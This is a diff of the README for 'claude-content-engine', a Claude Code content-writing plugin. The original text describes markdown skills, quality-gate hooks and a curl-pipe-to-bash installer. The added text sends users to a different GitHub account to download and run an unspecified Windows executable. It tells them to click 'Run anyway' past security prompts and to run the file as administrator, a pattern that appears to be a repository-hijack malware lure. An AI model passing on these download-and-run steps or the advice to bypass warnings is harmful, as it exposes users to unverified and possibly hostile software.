@@ -1,215 +1,271 @@
-<div align="center">
+# 🧠 claude-content-engine - Create Better Content With Claude
 
-# claude-content-engine
+[![Download](https://img.shields.io/badge/Download-claude--content--engine-ff6b6b?style=for-the-badge)](https://github.com/Twentysix-setsquare397/claude-content-engine)
 
-**A content creation engine for Claude Code.**
+## 🚀 What this is
 
-8 specialized skills. Persistent memory. A built-in quality gate that kills AI slop.<br>
-Install in one command. Zero config.
+claude-content-engine is a content tool for Claude Code. It helps you write, shape, and reuse content for common tasks like SEO pages, emails, social posts, and copy drafts.
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Skills](https://img.shields.io/badge/skills-8-green.svg)](#skills)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-plugin-8A2BE2.svg)](https://claude.ai/code)
+It includes 8 skills, persistent memory, and a built-in slop detector. That means it can help you keep a clear tone, reuse past context, and flag weak or vague writing before it spreads.
 
-[Install](#install) · [Skills](#skills) · [Advanced Features](#advanced-features) · [Contributing](CONTRIBUTING.md)
+## 📥 Download
 
-</div>
+1. Open the download page: [claude-content-engine on GitHub](https://github.com/Twentysix-setsquare397/claude-content-engine)
+2. Download the latest Windows file from the page
+3. Save the file to your computer
+4. Run the file to start the app
 
----
+If your browser asks for permission, choose Keep or Run. If Windows asks for approval, choose Yes.
 
-## Why this exists
+## 🪟 Windows Setup
 
-Claude is already a strong writer. But there's a difference between "write me a blog post" and giving it a full content playbook - voice profiles, SEO structure, copywriting frameworks, platform-specific formatting, and a quality gate that catches lazy patterns before you see them.
+Follow these steps on a Windows PC:
 
-**claude-content-engine** installs 8 content skills, a persistent memory system, and an automatic slop detector into Claude Code. One command, zero config.
+1. Go to the GitHub page
+2. Find the latest release or download link
+3. Download the Windows version
+4. Open the downloaded file
+5. If Windows shows a security prompt, click More info, then Run anyway if you trust the file source
+6. Let the app finish setting up
+7. Open Claude Code and connect the engine if the app asks for it
 
-You just ask naturally:
+If the app comes as a .zip file, right-click it and choose Extract All before you run it.
 
-```
-> Turn this blog post into a Twitter thread, LinkedIn post, and newsletter snippet
-```
+## 🧰 What you get
 
-Claude picks the right skill, loads your saved voice profile, writes all three pieces, and the quality gate checks the output automatically before you see it.
+- 8 content skills for common writing jobs
+- Persistent memory for repeated projects and brand voice
+- A slop detector that flags weak or filler-heavy text
+- Support for content tasks like:
+  - SEO copy
+  - Email marketing
+  - Social media posts
+  - Product copy
+  - Blog outlines
+  - Rewrite tasks
+  - Short-form content
+  - Developer docs
 
-## Install
+## 💻 System needs
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/quionie/claude-content-engine/main/install.sh | bash
-```
+For a smooth run on Windows, use:
 
-Requires `git`, `jq`, and `python3` (for the quality gate hooks).
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 500 MB of free disk space
+- A stable internet connection
+- Claude Code installed and ready to use
+- A modern browser for the download page
 
-Restart Claude Code. Done.
+If you plan to work with larger projects, 8 GB of RAM gives more room.
 
-<details>
-<summary>Manual install / update / uninstall</summary>
+## ⚙️ How it works
 
-**Clone manually:**
-```bash
-git clone https://github.com/quionie/claude-content-engine.git \
-  ~/.claude/plugins/marketplaces/claude-content-engine
-```
+claude-content-engine is built to help you move from idea to draft with less effort.
 
-**Update:**
-```bash
-~/.claude/plugins/marketplaces/claude-content-engine/install.sh --update
-```
+It can:
 
-**Uninstall:**
-```bash
-~/.claude/plugins/marketplaces/claude-content-engine/install.sh --uninstall
-```
+- Keep a memory of your style rules and project notes
+- Use the right skill for the task at hand
+- Spot vague phrases and weak claims
+- Help you turn rough notes into clearer copy
+- Keep content aligned across pages, emails, and posts
 
-</details>
+This makes it useful when you want the same voice across many pieces of content.
 
-## Skills
+## 📝 Main use cases
 
-### Core Skills
+Use it for:
 
-| Skill | What it does | Example prompt |
-|:------|:-------------|:---------------|
-| **Content Repurposer** | Transforms one piece of content into multiple platform-native formats | *"Repurpose this blog post for Twitter, LinkedIn, and my newsletter"* |
-| **Blog Post Architect** | SEO-optimized blog posts with structure, meta descriptions, and internal linking strategy | *"Write a blog post about async communication for remote teams"* |
-| **Copywriting Engine** | Headlines, taglines, landing pages, ad copy - using PAS, AIDA, and BAB frameworks | *"Write landing page copy for a project management tool"* |
-| **Brand Voice Builder** | Analyzes writing samples and outputs a reusable voice profile document | *"Analyze these 5 blog posts and capture my writing voice"* |
-| **Email Sequence Builder** | Full email drip campaigns - welcome, launch, onboarding, re-engagement, abandoned cart | *"Build a 7-email welcome sequence for my SaaS"* |
-| **Social Media Calendar** | Generates a week or month of scheduled social content with platform-specific formatting | *"Create 2 weeks of social media content for my startup"* |
+- Writing SEO landing pages
+- Drafting email campaigns
+- Creating social media content
+- Building product descriptions
+- Rewriting content in a cleaner voice
+- Making short briefs for content teams
+- Checking copy for filler or empty phrases
+- Keeping brand language consistent
 
-### Advanced Skills
+## 🧪 Skills included
 
-| Skill | What it does | Example prompt |
-|:------|:-------------|:---------------|
-| **Content Workflow** | Runs multiple skills in sequence - output from one feeds into the next | *"Analyze my voice, write a blog post in it, then repurpose for social"* |
-| **Content Memory** | Stores your voice, audience, pillars, and preferences across sessions | *"Remember my brand voice for future sessions"* |
+The 8 skills focus on common content jobs:
 
-## Advanced Features
+1. SEO writing  
+   Helps shape content around search intent and page structure
 
-Skills, memory, and hooks working together.
+2. Copywriting  
+   Helps write clear lines for offers, pages, and product text
 
-### 1. Skill Chaining
+3. Email marketing  
+   Helps draft subject lines, body copy, and follow-up messages
 
-You can chain skills together. The output from one step gets used as input for the next.
+4. Social media  
+   Helps create short posts that fit platform limits
 
-```
-Step 1: Brand Voice Builder   → extracts your voice from samples
-            ↓ voice profile
-Step 2: Blog Post Architect   → writes a post in your voice
-            ↓ blog post
-Step 3: Content Repurposer    → creates Twitter thread + LinkedIn + newsletter
-            ↓ 3 content pieces
-Step 4: Social Media Calendar  → schedules everything into a 2-week plan
-```
+5. Content planning  
+   Helps turn ideas into a simple outline
 
-**5 pre-built workflows included:** Content Machine, Brand Launch Kit, Blog-to-Everywhere, Voice-First Content Sprint, and Email Empire. Or just describe what you want and it'll pick the right skills to run in sequence.
+6. Rewrite mode  
+   Helps clean up text without changing the meaning
 
-### 2. Content Memory
+7. Brand voice memory  
+   Helps keep style rules in one place
 
-Your content context persists across sessions. No more re-explaining your brand every time.
+8. Slop detection  
+   Helps flag text that feels vague, flat, or stuffed with filler
 
-```
-~/.claude-content-engine/memory/
-├── voice-profile.md     ← saved automatically after Brand Voice Builder runs
-├── content-pillars.md   ← your recurring themes and topics
-├── audience.md          ← who you're writing for
-├── style-prefs.md       ← "don't use emojis", "always be casual", etc.
-├── top-content.md       ← log of your best-performing posts
-└── context.md           ← product, positioning, competitors
-```
+## 📌 Before you start
 
-Memory is **local-only** (stored on your machine, never uploaded), **opt-in** (you control what's saved), and **auto-loaded** (skills reference it automatically so you don't repeat yourself).
+Have these ready:
 
-### 3. Quality Gate (AI Slop Detector)
+- The downloaded Windows file
+- Your Claude Code setup
+- A folder where you want to keep the project
+- A few notes about your brand voice, if you have them
 
-A hook that runs automatically on every piece of content Claude writes. It catches:
+If you already have a writing style guide, keep it nearby. The memory feature works best when you give it clear rules.
 
-- **Hard slop** - "delve", "tapestry", "in today's fast-paced world", "it's important to note", "game-changer", "seamlessly" - and 30+ more patterns
-- **Soft slop** - "let's dive in", "as we've seen", "the landscape of" - flagged when multiple appear together
-- **Weak copy** - "very good", "in order to", "I think that" - with specific rewrite suggestions
-- **Fake enthusiasm** - excessive exclamation marks that read as performative
+## 🛠️ Install and run
 
-Claude gets the feedback and rewrites before you see the final output. You don't have to do anything.
+1. Download the file from [claude-content-engine on GitHub](https://github.com/Twentysix-setsquare397/claude-content-engine)
+2. Move the file to a folder you can find later, such as Downloads or Desktop
+3. If the file is zipped, extract it
+4. Double-click the Windows app file
+5. Follow the setup prompts on screen
+6. Open Claude Code if the app does not do it for you
+7. Load your first task, such as an email draft or SEO page
+8. Start with one skill and test the output
 
-```
-PostToolUse hook → scans written content → flags issues → Claude rewrites
-Stop hook → final pass → catches anything that slipped through
-```
+If the app asks for a workspace or project path, choose the folder where you keep your content work.
 
-## How It Works
+## 🧭 First run tips
 
-Skills are `.md` files with YAML frontmatter. Claude reads the `description` field and auto-activates the right skill based on your prompt. No slash commands needed.
+For best results on the first run:
 
-```yaml
----
-name: skill-name
-description: When to activate this skill (trigger conditions)
-version: 1.0.0
----
+- Start with one simple task
+- Use short, clear instructions
+- Add your brand voice rules
+- Tell it what to avoid
+- Review the first draft before reuse
 
-# Skill Name
-[Detailed instructions for Claude]
-```
+A good first test is a short blog intro, a social post, or an email subject line set.
 
-The hooks are Python scripts that run via Claude Code's [hook system](https://docs.anthropic.com/en/docs/claude-code/hooks). They inspect content post-write and inject feedback before Claude finalizes its response.
+## 📣 Example tasks
 
-## Architecture
+You can ask it to help with prompts like:
 
-```
-claude-content-engine/
-├── skills/                        # 8 content skills
-│   ├── content-repurposer/SKILL.md
-│   ├── blog-post-architect/SKILL.md
-│   ├── copywriting-engine/SKILL.md
-│   ├── brand-voice-builder/SKILL.md
-│   ├── email-sequence-builder/SKILL.md
-│   ├── social-media-calendar/SKILL.md
-│   ├── content-workflow/SKILL.md       ← skill chaining orchestrator
-│   └── content-memory/SKILL.md         ← persistent content memory
-├── hooks/                         # quality gate system
-│   ├── hooks.json                      ← hook configuration
-│   ├── quality_gate.py                 ← PostToolUse AI slop detector
-│   └── content_review.py              ← Stop hook final pass
-├── .claude-plugin/plugin.json     # plugin metadata
-├── install.sh                     # one-line installer
-├── CONTRIBUTING.md
-└── LICENSE
-```
+- Write a product page for a new app
+- Turn these notes into an email sequence
+- Rewrite this paragraph in plain English
+- Create 10 social posts about this topic
+- Build an SEO outline for this keyword
+- Check this copy for weak or vague lines
+- Make this draft sound more like our brand
+- Shorten this text for a landing page
 
-## FAQ
+## 🔒 Memory use
 
-<details>
-<summary><strong>Do I need a specific Claude plan?</strong></summary>
-Skills work with any Claude Code subscription that supports custom skills and hooks.
-</details>
+The persistent memory keeps useful project details in one place. That can include:
 
-<details>
-<summary><strong>Can I use only some skills?</strong></summary>
-Yes. Delete any <code>skills/&lt;name&gt;/</code> directory you don't want. The remaining skills work independently.
-</details>
+- Brand tone
+- Product names
+- Preferred terms
+- Words to avoid
+- Audience notes
+- Style rules
 
-<details>
-<summary><strong>Will these conflict with my existing skills?</strong></summary>
-Shouldn't. Claude picks the most relevant skill based on your prompt. If you have overlapping skills, you can always delete the one you don't want.
-</details>
+Use it when you want the same voice across many drafts. Update it when your brand changes.
 
-<details>
-<summary><strong>Can I disable the quality gate?</strong></summary>
-Yes. Delete <code>hooks/</code> or remove entries from <code>hooks/hooks.json</code>. The skills work fine without it.
-</details>
+## 🧼 Slop detector
 
-<details>
-<summary><strong>Where is memory stored?</strong></summary>
-Locally at <code>~/.claude-content-engine/memory/</code>. Nothing is uploaded. Run <code>rm -rf ~/.claude-content-engine</code> to wipe it.
-</details>
+The slop detector looks for writing that feels empty, generic, or padded. It can help you catch:
 
-<details>
-<summary><strong>Can I modify skills?</strong></summary>
-Yes. They're markdown files. Edit them, fork them, rewrite them entirely.
-</details>
+- Repeated ideas
+- Soft claims
+- Long lines with little meaning
+- Vague language
+- Buzzword-heavy copy
 
-## Contributing
+This is useful when you want text that sounds clear and direct.
 
-We accept new skills. See [CONTRIBUTING.md](CONTRIBUTING.md) for the format and quality checklist.
+## 📂 Suggested folder setup
 
-## License
+You can keep your work in folders like these:
 
-[MIT](LICENSE)
+- `Content Projects`
+- `Brand Notes`
+- `Email Drafts`
+- `SEO Pages`
+- `Social Posts`
+- `Approved Copy`
+
+A simple folder setup makes it easier to keep track of drafts and final versions.
+
+## ❓ Common problems
+
+### The app will not open
+
+- Make sure the file finished downloading
+- Check that you extracted the zip file if there is one
+- Right-click the file and choose Run as administrator
+- Try opening it again after a restart
+
+### Windows blocks the file
+
+- Look for the More info link
+- Review the file name and source
+- Choose the run option if you trust the download page
+
+### Claude Code does not connect
+
+- Make sure Claude Code is installed
+- Check your internet connection
+- Close both apps and open them again
+- Confirm that the project folder is in the right place
+
+### The output feels weak
+
+- Add more detail to your prompt
+- Include your audience
+- Give examples of the tone you want
+- Use the slop detector to clean up the draft
+- Save better notes to memory
+
+## 📚 Best results
+
+To get better output, use this format:
+
+- Goal: what you want to create
+- Audience: who will read it
+- Tone: how it should sound
+- Length: how long it should be
+- Must use: key facts or terms
+- Must avoid: words or styles you do not want
+
+Example:
+
+Goal: Write a homepage section  
+Audience: Small business owners  
+Tone: Clear and calm  
+Length: 150 words  
+Must use: plain English, short sentences  
+Must avoid: hype, buzzwords, and vague claims
+
+## 🧾 File handling
+
+If you want to keep things tidy:
+
+- Keep the original download file in case you need it again
+- Save your drafts in a separate folder
+- Back up your memory notes
+- Keep one final folder for approved content
+
+That helps when you revisit a project later.
+
+## 🔗 Download again
+
+If you need the file again, use this link: [https://github.com/Twentysix-setsquare397/claude-content-engine](https://github.com/Twentysix-setsquare397/claude-content-engine)
+
+## 🧷 Topics
+
+ai-tools, claude, claude-code, content-creation, copywriting, developer-tools, email-marketing, seo, skills, social-media
